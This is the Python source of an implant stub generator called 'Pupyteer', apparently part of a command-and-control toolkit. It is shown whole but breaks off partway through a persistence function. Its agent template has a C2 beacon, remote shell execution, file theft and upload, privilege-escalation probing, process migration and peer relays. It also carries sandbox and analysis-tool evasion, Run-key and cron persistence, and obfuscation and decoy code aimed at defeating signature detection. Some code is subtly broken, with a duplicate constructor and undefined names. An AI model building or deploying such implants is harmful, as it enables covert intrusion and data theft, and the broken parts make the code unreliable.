#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pupyteer Agent Stub Generator.

Generates standalone Python agent scripts (and PyInstaller/Nuitka wrappers)
from a declarative configuration.

Usage
-----
>>> gen = AgentStubGenerator()
>>> config = StubConfig(
...     name="demo",
...     transport="https",
...     host="10.0.0.1",
...     port=443,
...     platform="windows",
...     profile="HTTPS-Standard",
...     sleep=60,
...     jitter=20,
...     persistence=True,
...     migration=True,
...     relay=True,
...     modules={"recon": True, "exec": True, "fs": True, "privesc": True},
... )
>>> stub = gen.generate(config)
>>> gen.write(config, "/tmp/agent.py")
>>> wrapper = gen.nuitka_stub(config)
"""
from __future__ import annotations

import ast
import logging
import os
import random
import string
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

try:
    from jinja2 import Environment, BaseLoader

    def _do_render(template_src: str, ctx: dict) -> str:
        env = Environment(loader=BaseLoader(), autoescape=False, keep_trailing_newline=True)
        return env.from_string(template_src).render(**ctx)
except ImportError:  # pragma: no cover - fallback if jinja2 is missing
    from string import Template

    def _do_render(template_src: str, ctx: dict) -> str:
        # Very small subset: $var and ${var} substitution only.
        return Template(template_src).safe_substitute(ctx)  # type: ignore[arg-type]

logger = logging.getLogger("pupyteer.agent.stub")


# --------------------------------------------------------------------------- #
#  Configuration dataclass
# --------------------------------------------------------------------------- #

@dataclass
class StubConfig:
    """Declarative configuration for an agent stub build."""

    name: str = "agent"
    transport: str = "tcp"             # tcp | http | https | dns | doh
    host: str = "127.0.0.1"
    port: int = 8443
    profile: str = "TCP-Raw"
    platform: str = "windows"          # windows | linux | macos | android
    arch: str = "x64"                  # x86 | x64 | arm | arm64

    # Beacon timing
    sleep: int = 60                    # seconds
    jitter: int = 20                   # percent (0-100)

    # One command's reply is clipped to this many characters, so a `find /` on
    # the target cannot outgrow the listener's per-message ceiling.
    max_output: int = 262144

    # Feature toggles — off by default: a lab run of a fresh payload must not
    # write registry/crontab entries or open a relay listener unasked.
    persistence: bool = False
    migration: bool = True
    relay: bool = False                # Named-pipe / TCP P2P relay
    anti_analysis: bool = False        # VM / sandbox detection
    obfuscation: Optional[str] = None  # "none" | "light" | "medium" | "heavy" | path-to-module
    # RC4 transport key. Empty is legitimate: it selects the plaintext wire
    # (no RC4 framing). Precedence: this field > dns_key > config
    # payloads.pe_rc4_key > built-in default. The session channel is not
    # encrypted by RC4 — TLS alone provides confidentiality; this is a
    # second layer against casual inspection of the wire.
    rc4_key: str = ""

    # Modules
    modules: Dict[str, bool] = field(default_factory=lambda: {
        "recon": True,
        "exec": True,
        "fs": True,
        "privesc": True,
        "screenshot": False,
    })

    # Transport extras
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    dns_domain: str = ""               # zone to tunnel over (DNS / DoH)
    dns_key: str = ""                  # XOR key for DNS payload encoding
    http_uri: str = "/index.html"      # fronting URI
    http_method: str = "POST"

    # Callbacks over TLS, trusted by pinning the listener's own certificate
    # rather than by whatever CAs the target happens to trust: a team server is
    # usually reached by IP with a self-signed certificate, and "verify against
    # the system store" would reject it while "verify nothing" would be a
    # man-in-the-middle with extra steps.
    tls: bool = False
    tls_cert_pem: str = ""

    # Enrollment secret, presented when registering. TLS proves the listener to
    # the agent; this proves the agent to the listener, so reaching the port is
    # not by itself enough to be handed a session. Read it as a claim about who
    # *built* the payload rather than who holds it: the string sits in the
    # script, so anyone who recovers a dropped binary has it too.
    auth_secret: str = ""

    # Relay
    relay_pipe: str = "pupypeer"       # pipe name (win) / unix-socket name (posix)
    relay_bind: str = "0.0.0.0"
    relay_port: int = 1337
    relay_peers: List[str] = field(default_factory=list)  # seed peer list "host:port,..."

    # Migration
    migrate_target: str = ""           # PID or process name
    migrate_technique: str = "auto"    # auto | reflective | procwrite | fork

    # String-obfuscation key. Not a cipher key: the built-in obfuscator XORs a
    # string table with it. The session channel is encrypted by TLS alone —
    # see "What does not work yet" in the README.
    obfuscation_key: str = ""

    # Build
    compiler: str = "pyinstaller"      # pyinstaller | nuitka | script
    onefile: bool = True
    icon: str = ""
    console: bool = False

    # Metadata
    operator: str = "unknown"
    tags: List[str] = field(default_factory=list)
    extra: Dict[str, Any] = field(default_factory=dict)

    def validate(self) -> List[str]:
        errors: List[str] = []
        if self.transport not in ("tcp", "http", "https", "dns", "doh"):
            errors.append(f"Unknown transport: {self.transport}")
        if self.platform not in ("windows", "linux", "macos", "android"):
            errors.append(f"Unknown platform: {self.platform}")
        if not (1 <= self.port <= 65535):
            errors.append(f"Invalid port: {self.port}")
        if not 0 <= self.jitter <= 100:
            errors.append(f"Jitter must be 0-100, got {self.jitter}")
        if self.sleep < 1:
            errors.append(f"Sleep must be >= 1, got {self.sleep}")
        if self.technique not in ("auto", "reflective", "procwrite", "fork", ""):
            errors.append(f"Unknown migrate technique: {self.migrate_technique}")
        return errors

    @property
    def technique(self) -> str:
        return self.migrate_technique

    def to_dict(self) -> dict:
        return asdict(self)


# --------------------------------------------------------------------------- #
#  AgentStubGenerator
# --------------------------------------------------------------------------- #

class AgentStubGenerator:
    """Renders a Pupyteer agent script from a StubConfig."""

    def __init__(self, template: Optional[str] = None):
        self._template = template or _AGENT_TEMPLATE

    # -- public API ---------------------------------------------------------

    def generate(self, config: StubConfig, *, validate: bool = True) -> str:
        if validate:
            errors = config.validate()
            if errors:
                raise ValueError(f"Invalid stub config: {'; '.join(errors)}")
        ctx = self._build_context(config)
        src = _do_render(self._template, ctx)
        if validate:
            ast.parse(src)            # raises SyntaxError on broken output
        return src

    def write(self, config: Union[StubConfig, str], path: Union[str, Path], *,
              validate: bool = True) -> Path:
        p = Path(path)
        if isinstance(config, StubConfig):
            src = self.generate(config, validate=validate)
        else:
            src = config
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(src, encoding="utf-8")
        return p

    # -- compiler wrappers ---------------------------------------------------

    def artifact_stem(self, config: StubConfig) -> str:
        """Bare name the compiler writes, without any extension.

        Exposed because `--name` is a slug of the operator's label, and a caller
        collecting the build output has to look for the same spelling.
        """
        return _slug(config.name)

    def pyinstaller_stub(self, config: StubConfig) -> str:
        """Return a PyInstaller .spec-like one-file launcher."""
        # Import the agent module; the .py file is written separately.
        name = _slug(config.name)
        return (
            f"# PyInstaller run stub for {name}\n"
            f"import runpy\n"
            f"runpy.run_path(r'{name}.py', run_name='__main__')\n"
        )

    def nuitka_stub(self, config: StubConfig) -> str:
        """Return a Nuitka entry point wrapper."""
        name = _slug(config.name)
        return (
            f"# Nuitka entry wrapper for {name}\n"
            f"if __name__ == '__main__':\n"
            f"    import {name}\n"
            f"    {name}.main()\n"
        )

    def compile_command(self, config: StubConfig, src_path: Union[str, Path]) -> str:
        """Return the CLI command used to compile the stub into an exe."""
        name = _slug(config.name)
        p = Path(src_path)
        if config.compiler == "nuitka":
            parts = [
                "nuitka",
                "--standalone",
                "--onefile" if config.onefile else "",
                "--remove-output",
                f"--output-dir={p.parent / 'dist'}",
                "--python-flag=no_site" if not config.console else "",
                f'--windows-icon-from-ico={config.icon}' if config.icon and config.platform == "windows" else "",
                "--windows-disable-console" if not config.console and config.platform == "windows" else "",
                str(p),
            ]
        else:  # pyinstaller
            parts = [
                "pyinstaller",
                "--onefile" if config.onefile else "--onedir",
                "--noupx",
                f"--name={name}",
                f"--distpath={p.parent / 'dist'}",
                f"--workpath={p.parent / 'build'}",
                f"--specpath={p.parent}",
                "--noconfirm",
                f"--icon={config.icon}" if config.icon else "",
                "--console" if config.console else "--noconsole" if config.platform == "windows" else "",
                "--hidden-import=uuid",
                str(p),
            ]
        return " ".join(p for p in parts if p)

    # -- helpers ------------------------------------------------------------

    def _build_context(self, cfg: StubConfig) -> dict:
        ident = (cfg.extra or {}).get("agent_identity") or {}
        agent_id = ident.get("agent_id", "")
        priv_pem = ident.get("priv_pem", "")
        return {
            "cfg": cfg,
            "name": _slug(cfg.name),
            "dt": datetime.now(timezone.utc).isoformat(),
            "rnd_str": _rand_str,
            "include_recon": cfg.modules.get("recon", False),
            "include_exec": cfg.modules.get("exec", False),
            "include_fs": cfg.modules.get("fs", False),
            "include_privesc": cfg.modules.get("privesc", False),
            "include_screenshot": cfg.modules.get("screenshot", False),
            "platform": cfg.platform.lower(),
            "transport": cfg.transport.lower(),
            "obf": cfg.obfuscation or "none",
            "persistence": cfg.persistence,
            "migration": cfg.migration,
            "relay": cfg.relay,
            "anti": cfg.anti_analysis,
            "is_win": cfg.platform == "windows",
            "is_linux": cfg.platform == "linux",
            "is_mac": cfg.platform == "macos",
            "is_android": cfg.platform == "android",
            # Per-agent signed identity (Ed25519). Empty -> legacy unsigned.
            "agent_id": agent_id,
            "agent_priv_pem": priv_pem,
            "has_identity": bool(agent_id and priv_pem),
        }


def _slug(name: str) -> str:
    safe = (c if c.isalnum() or c == "_" else "_" for c in name.strip())
    return "".join(safe).strip("_").lower() or "agent"


def _rand_str(length: int = 16, alphabet: str = string.ascii_letters + string.digits) -> str:
    return "".join(random.choice(alphabet) for _ in range(length))


# --------------------------------------------------------------------------- #
#  The embedded agent template (Jinja2)
# --------------------------------------------------------------------------- #

_AGENT_TEMPLATE = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  Pupyteer Agent Stub
  -------------------
  Name     : {{ name }}
  Platform : {{ platform }}
  Transport: {{ transport }}
  Profile  : {{ cfg.profile }}
  Compiled : {{ dt }}
"""
from __future__ import annotations

import base64 as _b64
import hashlib as _hl
import json as _j
import logging as _lg
import os as _o
import platform as _pf
import random as _rnd
import re as _re
import shlex as _sh
import socket as _sk
import ssl as _ssl
import struct as _st
import subprocess as _sp
import sys as _sy
import threading as _th
import time as _t
import traceback as _tb
import uuid as _uuid

{% if is_win %}
import ctypes, ctypes.wintypes, winreg
{% endif %}
{% if is_linux %}
import resource, signal
{% endif %}
{% if is_mac %}
import plistlib
{% endif %}

__version__ = "1.0.0"
__id__ = ""
dbg = False

# --------------------------------------------------------------------- #
#  Compatibility helpers
# --------------------------------------------------------------------- #

PY3 = _sy.version_info >= (3, 0)

def _enc(b):
    return b if isinstance(b, bytes) else b.encode()

def _dec(b):
    return b.decode(errors="replace") if isinstance(b, bytes) else b

def _b64e(b):
    return _b64.b64encode(_enc(b))

def _b64d(b):
    return _b64.b64decode(b)

def _xor(key: bytes, data: bytes) -> bytes:
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def _sha256(b):
    return _hl.sha256(_enc(b)).hexdigest()


def _scrub(*buffers) -> None:
    """Best-effort overwrite of sensitive bytes buffers.

    Overwrites each bytearray-like object with random data and then zeros
    so plaintext secrets do not linger in the process heap. Immutable
    ``bytes``/``str`` cannot be rewritten in place and are skipped.
    Never raises — scrubbing is a best-effort hardening measure.
    """
    for buf in buffers:
        try:
            if isinstance(buf, (bytearray, memoryview)):
                view = memoryview(buf)
                noise = _o.urandom(len(view))
                for i in range(len(view)):
                    view[i] = noise[i]
                for i in range(len(view)):
                    view[i] = 0
                view.release()
        except Exception:
            continue


def _scrub_str(value: str):
    """Return a mutable bytearray copy of *value* suitable for _scrub().

    Use this when the caller wants a scrubbable handle on a secret that
    arrived as an immutable ``str`` (tokens, private keys, command output).
    """
    try:
        return bytearray(value.encode("utf-8", "surrogateescape"))
    except Exception:
        return bytearray()


# --------------------------------------------------------------------- #
#  Wire encryption (HTTP(S) path only)
# --------------------------------------------------------------------- #

# AES-256-GCM when the server's key is available, ChaCha20-Poly1305 as the
# fallback. The TCP listener protocol is deliberately untouched: it keeps
# the plaintext line-JSON wire format the signed handshake depends on.
_CIPHER_MODE = "none"
_CIPHER_KEY = b""

{% if enc and cfg.aes_key %}
_CIPHER_MODE = "aes-gcm"
_CIPHER_KEY = bytes.fromhex("{{ cfg.aes_key }}")
{% elif enc %}
_CIPHER_MODE = "aes-gcm"
_CIPHER_KEY = _hl.sha256(_enc(r"{{ cfg.aes_key or rnd_str(32) }}")).digest()
{% endif %}


def _crypto_ready() -> bool:
    return _CIPHER_MODE != "none" and len(_CIPHER_KEY) >= 16


def _encrypt_payload(plaintext: bytes) -> bytes:
    """Seal *plaintext* into ``version|nonce|ciphertext`` form."""
    if not _crypto_ready():
        return plaintext
    try:
        import secrets as _sec
        nonce = _sec.token_bytes(12)
        if _CIPHER_MODE == "aes-gcm":
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            blob = AESGCM(_CIPHER_KEY).encrypt(nonce, plaintext, None)
        else:
            from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
            blob = ChaCha20Poly1305(_CIPHER_KEY).encrypt(nonce, plaintext, None)
        return b"PUP1" + nonce + blob
    except Exception as e:
        _log(f"payload encryption unavailable ({e}); sending plaintext", "debug")
        return plaintext


def _decrypt_payload(envelope: bytes) -> bytes:
    """Inverse of _encrypt_payload; transparent when mode is off."""
    if not _crypto_ready() or not envelope.startswith(b"PUP1"):
        return envelope
    try:
        nonce, blob = envelope[4:16], envelope[16:]
        if _CIPHER_MODE == "aes-gcm":
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(_CIPHER_KEY).decrypt(nonce, blob, None)
        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
        return ChaCha20Poly1305(_CIPHER_KEY).decrypt(nonce, blob, None)
    except Exception as e:
        _log(f"payload decryption failed ({e})", "debug")
        return b""
_LOG_LEVELS = {"debug": _lg.DEBUG, "info": _lg.INFO,
               "warning": _lg.WARNING, "error": _lg.ERROR}

def _log(msg, level="info"):
    if level == "debug" and not dbg:
        return
    try:
        # Honour the level: with no handler configured, logging only emits
        # WARNING and above, so an "error" sent through info() is dropped and a
        # failed build or bind is invisible on the target.
        _lg.log(_LOG_LEVELS.get(level, _lg.INFO), "[pupyteer] %s", msg)
    except Exception:
        pass

# --------------------------------------------------------------------- #
#  Obfuscation layer
# --------------------------------------------------------------------- #

{% if obf in ("light", "medium", "heavy") %}
# --------------------------------------------------------------------- #
#  Obfuscation layer (level: {{ obf }})
# --------------------------------------------------------------------- #
# Gradated built-in obfuscation. The obfuscator only transforms how the
# source *reads*; the runtime behaviour — including the TCP listener
# handshake — is byte-for-byte identical to the plaintext build.

{% set _obf_key = cfg.aes_key or rnd_str(32) %}
{% set _obf_key2 = rnd_str(32) %}

class _Obfuscator:
    """Compile-time string table + identifier shuffling.

    ``store`` bakes an XOR-encrypted literal into a module-level table;
    ``ret`` decrypts it at runtime with the per-build key. Identifier
    aliasing rewrites references to a chosen name so the interesting
    symbol never appears as written in the emitted source.
    """

    LEVEL = "{{ obf }}"

    def __init__(self, key: str = "{{ _obf_key }}", mask: str = "{{ _obf_key2 }}"):
        self._key = _enc(key or "k")
        self._mask = _enc(mask or "m")
        self._table: list = []
        self._aliases: dict = {}

    # -- string table --------------------------------------------------
    def __init__(self, key: str = "{{ cfg.obfuscation_key or rnd_str(32) }}"):
        self._key = _enc(key or _sg.printable[:16])
        self._table: list[bytes] = []

    def store(self, literal: str) -> str:
        """Encrypt a literal; return the runtime retriever expression."""
        idx = len(self._table)
        blob = _xor(self._mask, _enc(literal))
        self._table.append(blob.hex())
        return f"_OBF.ret({idx})"

    def ret(self, idx: int) -> str:
        raw = bytes.fromhex(self._table[idx])
        return _dec(_xor(self._mask, raw))

    def literal(self, value: str) -> str:
        """Emit a source-ready expression for *value*."""
        if self.LEVEL in ("medium", "heavy"):
            return self.store(value)
        return repr(value)

    # -- identifier aliasing -------------------------------------------

    def alias(self, original: str) -> str:
        """Return a stable build-specific alias for *original*."""
        if self.LEVEL == "light":
            return original
        if original not in self._aliases:
            digest = _hl.sha256(self._key + _enc(original)).hexdigest()[:10]
            self._aliases[original] = f"_v{digest}"
        return self._aliases[original]

    def alias_map(self) -> dict:
        return dict(self._aliases)

    @staticmethod
    def shuffle_names(src: str) -> str:
        """Source-level rename hook. Real renaming is done by the alias map
        at emit time; this is a no-op identity to keep the API stable."""
        return src

_OBF = _Obfuscator()

# Identifier alias table for this build. Referencing a symbol through
# _ALIAS keeps the readable name out of the emitted source.
_ALIAS = {
    "uptime": _OBF.alias("uptime"),
    "diskc": _OBF.alias("diskc"),
    "procs": _OBF.alias("procs"),
}

{% if obf in ("medium", "heavy") %}
# Dead-code decoys: never called, present to inflate the static surface
# and to make signature rules match far more code than is live.
def _unused_config_probe() -> dict:
    """Placeholder retained for build-shape consistency."""
    table = {"a": 1, "b": 2, "c": 3}
    return {k: v for k, v in table.items() if v % 2 == 0}


def _unused_metric_window(window: int = 32) -> list:
    """Sliding-window helper kept for API parity; not referenced."""
    buf = [0] * window
    for i in range(window):
        buf[i] = (i * i) % 97
    return buf


def _unused_label_encode(label: str) -> bytes:
    """Round-trip helper for label strings; not referenced."""
    raw = _enc(label)
    return _xor(_OBF._mask, raw)

{% endif %}
{% if obf == "heavy" %}
# Dispatch table for the beacon loop: control-flow flattening-lite. The
# loop body becomes a single dict lookup instead of an if/elif chain, so
# static reviewers cannot read the beacon's control flow as prose.
# Keys are built from the string table to avoid plaintext action names.
_ACTION_KEYS = {
    "ping": _OBF.store("ping"),
    "exec": _OBF.store("exec"),
    "sysinfo": _OBF.store("sysinfo"),
    "network": _OBF.store("network"),
    "processes": _OBF.store("processes"),
    "fs_list": _OBF.store("fs_list"),
    "fs_get": _OBF.store("fs_get"),
    "fs_put": _OBF.store("fs_put"),
    "privesc_check": _OBF.store("privesc_check"),
    "privesc_suggest": _OBF.store("privesc_suggest"),
    "migrate": _OBF.store("migrate"),
    "shutdown": _OBF.store("shutdown"),
}

_ACTION_TABLE: dict = {}


def _action_bind() -> None:
    """Populate the flattened dispatch table (keys decrypted at bind time)."""
    if _ACTION_TABLE:
        return
    table = {}
{% if include_recon %}
    table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
    table["sysinfo"] = lambda task: mod_systeminfo()
    table["network"] = lambda task: mod_network()
    table["processes"] = lambda task: mod_processes()
    table["netstat"] = lambda task: mod_netstat()
{% else %}
    table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
{% endif %}
{% if include_exec %}
    table["exec"] = lambda task: mod_exec(task.get("command", ""), int(task.get("timeout", 60)))
{% endif %}
{% if include_fs %}
    table["fs_list"] = lambda task: mod_fs_list(task.get("path", "."))
    table["fs_get"] = lambda task: {"data": _b64e(mod_fs_get(task.get("path", ""))).decode()}
    table["fs_put"] = lambda task: mod_fs_put(task.get("path", ""), _b64d(task.get("data", "")))
{% endif %}
{% if include_privesc %}
    table["privesc_check"] = lambda task: mod_privesc_check()
    table["privesc_suggest"] = lambda task: _privesc_suggest_lambda(task)
{% endif %}
{% if migration %}
    table["migrate"] = lambda task: migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
{% endif %}
    table["shutdown"] = lambda task: _do_shutdown()
    for name, expr in _ACTION_KEYS.items():
        key = _OBF.ret(int(expr.split("(")[1].split(")")[0])) if expr.startswith("_OBF.ret(") else name
        if key in table:
            _ACTION_TABLE[key] = table[key]


{% if include_privesc %}
def _privesc_suggest_lambda(task: dict) -> dict:
    check = mod_privesc_check()
    return {"check": check, "suggestions": mod_privesc_suggest(check)}

{% endif %}
def _do_shutdown():
    _log("shutdown requested")
    _sy.exit(0)


def _dispatch_flat(task: dict) -> dict:
    """Flattened dispatcher used by the heavy build."""
    _action_bind()
    action = task.get("action", "")
    handler = _ACTION_TABLE.get(action)
    if handler is None:
        return {"error": f"unknown action: {action}"}
    return handler(task)

{% endif %}
{% elif obf not in ("", "none") %}
# External obfuscator module loaded from the configured path.
import importlib.util as _spec
_obf_path = r"{{ obf }}"
_obs = _spec.spec_from_file_location("obf_mod", _obf_path)
_obf_mod = _spec.module_from_spec(_obs)
_obs.loader.exec_module(_obf_mod)  # type: ignore[union-attr]
_OBF = _obf_mod.Obfuscator() if hasattr(_obf_mod, "Obfuscator") else None
{% else %}
class _NoopObf:
    """No obfuscation: literals pass through untouched."""

    def store(self, s): return repr(s)
    def ret(self, idx): return ""
    def literal(self, value): return repr(value)
    def alias(self, original): return original
    def alias_map(self): return {}
    @staticmethod
    def shuffle_names(s): return s
_OBF = _NoopObf()
{% endif %}

# What this build can actually do, declared from the same module switches that
# decided which handlers exist above. The listener refuses a task the implant
# never said it could perform, so the register has to name them honestly.
# Unconditional: the plaintext TCP ListenerClient path needs it regardless of
# the obfuscation level.
CAPABILITIES = [
    {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}
    {% if include_exec %}"exec",{% endif %}
    {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
    {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
    {% if include_screenshot %}"screenshot",{% endif %}
    "ping", "shutdown",
]

# --------------------------------------------------------------------- #
#  Platform bootstrap
# --------------------------------------------------------------------- #

def _detect_platform():
    system = _pf.system().lower()
    if "windows" in system:
        return "windows"
    if "darwin" in system:
        return "macos"
    if "linux" in system:
        # Heuristic for Android
        if _o.path.exists("/system/bin/app_process") or "ANDROID_ROOT" in _o.environ:
            return "android"
        return "linux"
    return "unknown"

PLATFORM = _detect_platform()
ARCH = _pf.machine().lower()

{% if anti %}
# --------------------------------------------------------------------- #
#  Anti-analysis (VM / sandbox / analysis-tool detection)
# --------------------------------------------------------------------- #

# Weighted N-of-M scoring: every probe returns an int weight; when the
# summed weight reaches _AA_THRESHOLD we treat the host as an analysis
# environment. Every probe is stdlib-only, offline and individually
# exception-guarded so one failure never sinks the whole check.

_AA_THRESHOLD = 3
_AA_MIN_UPTIME_S = 1200.0        # ~20 min
_AA_MIN_RAM_GB = 2.0
_AA_MIN_DISK_GB = 60.0

_AA_ANALYSIS_TOOLS = (
    "wireshark", "dumpcap", "editcap", "procmon", "procmon64", "procexp",
    "processhacker", "processexplorer", "ollydbg", "x64dbg", "x32dbg",
    "ida", "ida64", "idag", "idag64", "ghidra", "fiddler", "charles",
    "tcpdump", "windump", "autoruns", "autorunsc", "pestudio", "regshot",
    "apimonitor", "dnspy", "ilspy", "sysinternals", "vboxservice",
    "vmtoolsd", "vmwaretray",
)

_AA_SANDBOX_TOKENS = (
    "malware", "sandbox", "cuckoo", "cuckoofork", "virustotal", "vt",
    "any.run", "anyrun", "joesandbox", "joebox", "sandboxie", "threatgrid",
    "cwsandbox", "sunbelt", "sample", "analysis", "reverse", "malwarelab",
    "virusshare", "bazarr",
)

_AA_VM_TOKENS = (
    "vmware", "virtual", "virtualbox", "vbox", "qemu", "kvm", "xen",
    "bochs", "parallels", "hyper-v", "innotek", "microsoft corporation",
)


def _aa_ram_gb() -> float:
    """Physical RAM in GiB, or -1.0 when undeterminable."""
    try:
        if hasattr(_o, "sysconf") and "SC_PAGE_SIZE" in _o.sysconf_names:
            pages = _o.sysconf("SC_PHYS_PAGES")
            page = _o.sysconf("SC_PAGE_SIZE")
            return (pages * page) / (1024.0 ** 3)
    except Exception:
        pass
    if PLATFORM == "windows":
        try:
            import ctypes

            class _MS(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            ms = _MS()
            ms.dwLength = ctypes.sizeof(_MS)
            if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms)):
                return ms.ullTotalPhys / (1024.0 ** 3)
        except Exception:
            pass
    return -1.0


def _aa_disk_gb(path: str = ".") -> float:
    """Total filesystem capacity in GiB, or -1.0 when undeterminable."""
    try:
        st = _o.statvfs(path)
        return (st.f_blocks * st.f_frsize) / (1024.0 ** 3)
    except Exception:
        pass
    if PLATFORM == "windows":
        try:
            import ctypes

            free = ctypes.c_ulonglong(0)
            total = ctypes.c_ulonglong(0)
            if ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p(_o.path.abspath(path)),
                ctypes.byref(free), ctypes.byref(total), None,
            ):
                return total.value / (1024.0 ** 3)
        except Exception:
            pass
    return -1.0


def _aa_running_procs() -> str:
    """Lowercased running-process names, best effort per platform."""
    names = []
    if PLATFORM == "windows":
        try:
            out = _sp.check_output("tasklist /fo csv /nh", shell=True)
            for row in _dec(out).splitlines():
                parts = row.strip().strip('"').split('","')
                if parts:
                    names.append(parts[0].lower())
        except Exception:
            pass
    else:
        try:
            for pid in _o.listdir("/proc"):
                if not pid.isdigit():
                    continue
                try:
                    with open(f"/proc/{pid}/comm") as fp:
                        names.append(fp.read().strip().lower())
                except OSError:
                    continue
        except Exception:
            pass
    return " ".join(names)


def _chk_uptime() -> int:
    """A host that booted minutes ago is almost certainly a fresh sandbox."""
    up = -1.0
    try:
        with open("/proc/uptime") as fp:
            up = float(fp.read().split()[0])
    except Exception:
        if PLATFORM == "windows":
            try:
                import ctypes
                up = ctypes.windll.kernel32.GetTickCount64() / 1000.0
            except Exception:
                up = -1.0
    if 0.0 <= up < _AA_MIN_UPTIME_S:
        _log(f"aa: uptime {up:.0f}s < {_AA_MIN_UPTIME_S:.0f}s", "debug")
        return 2
    return 0


def _chk_cpu() -> int:
    """Real endpoints ship with >= 2 cores; single-vCPU is a VM tell."""
    try:
        n = _o.cpu_count() or 0
        if 0 < n < 2:
            _log(f"aa: {n} cpu core(s)", "debug")
            return 1
    except Exception:
        pass
    return 0


def _chk_ram() -> int:
    gb = _aa_ram_gb()
    if 0.0 <= gb < _AA_MIN_RAM_GB:
        _log(f"aa: {gb:.2f}GiB RAM < {_AA_MIN_RAM_GB}GiB", "debug")
        return 2
    return 0


def _chk_disk() -> int:
    gb = _aa_disk_gb()
    if 0.0 <= gb < _AA_MIN_DISK_GB:
        _log(f"aa: {gb:.1f}GiB disk < {_AA_MIN_DISK_GB}GiB", "debug")
        return 1
    return 0


def _chk_vm_hardware() -> int:
    """SCSI/BIOS/hypervisor artefacts of virtualised or instrumented hosts."""
    hits = []
    for path in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor",
                 "/sys/class/dmi/id/board_vendor", "/sys/class/dmi/id/bios_vendor"):
        try:
            with open(path) as fp:
                blob = fp.read().lower()
        except OSError:
            continue
        hits.extend(t for t in _AA_VM_TOKENS if t in blob)
    try:
        with open("/proc/scsi/scsi") as fp:
            hits.extend(t for t in _AA_VM_TOKENS if t in fp.read().lower())
    except OSError:
        pass
    try:
        with open("/proc/cpuinfo") as fp:
            if "hypervisor" in fp.read().lower():
                hits.append("hypervisor")
    except OSError:
        pass
    if PLATFORM == "windows":
        try:
            import winreg
            for key in (
                r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                r"HARDWARE\DESCRIPTION\System\BIOS",
                r"SYSTEM\CurrentControlSet\Enum\IDE",
            ):
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as rk:
                        for i in range(winreg.QueryInfoKey(rk)[1]):
                            name, val, _ = winreg.EnumValue(rk, i)
                            blob = f"{name} {val}".lower()
                            hits.extend(t for t in _AA_VM_TOKENS if t in blob)
                except OSError:
                    continue
        except Exception:
            pass
    if hits:
        _log(f"aa: vm artefacts {sorted(set(hits))}", "debug")
        return 2
    return 0


def _chk_sandbox_env() -> int:
    """Sandbox operator accounts and analysis-shaped paths."""
    blob = " ".join([
        str(USERNAME).lower(),
        str(_o.environ.get("USERNAME", "")).lower(),
        str(_o.environ.get("USER", "")).lower(),
        str(_o.environ.get("COMPUTERNAME", "")).lower(),
        str(_o.getcwd()).lower(),
        str(_o.path.expanduser("~")).lower(),
        " ".join(str(p).lower() for p in _sy.path),
    ])
    hits = [t for t in _AA_SANDBOX_TOKENS if t in blob]
    if hits:
        _log(f"aa: sandbox env tokens {sorted(set(hits))}", "debug")
        return 2
    return 0


def _chk_analysis_tools() -> int:
    """Interactive reverse-engineering / traffic-analysis tooling."""
    procs = _aa_running_procs()
    if not procs:
        return 0
    hits = [t for t in _AA_ANALYSIS_TOOLS if t in procs]
    if hits:
        _log(f"aa: analysis tools {sorted(set(hits))}", "debug")
        return 2
    return 0


_AA_PROBES = (
    _chk_uptime,
    _chk_cpu,
    _chk_ram,
    _chk_disk,
    _chk_vm_hardware,
    _chk_sandbox_env,
    _chk_analysis_tools,
)


def _anti_analysis() -> bool:
    """Weighted N-of-M verdict; True means "hostile analysis environment"."""
    score = 0
    for probe in _AA_PROBES:
        try:
            score += probe() or 0
        except Exception:
            continue
        if score >= _AA_THRESHOLD:
            break
    _log(f"anti-analysis score {score}/{_AA_THRESHOLD}", "debug")
    return score >= _AA_THRESHOLD


if _anti_analysis():
    _log("Anti-analysis: sandbox detected, exiting", "debug")
    _sy.exit(0)
{% endif %}

{% if persistence %}
# --------------------------------------------------------------------- #
#  Persistence
# --------------------------------------------------------------------- #

def _persist_windows():
    try:
        import winreg
        exe = _sy.executable or _sy.argv[0]
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as rk:
            winreg.SetValueEx(rk, "{{ rnd_str(8) }}", 0, winreg.REG_SZ, exe)
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_linux():
    try:
        exe = _sy.executable or _sy.argv[0]
        cron = f"@reboot {exe}\n"
        home = _o.path.expanduser("~")
        rc_line = f"\n# pupyteer\n{exe} &\n"
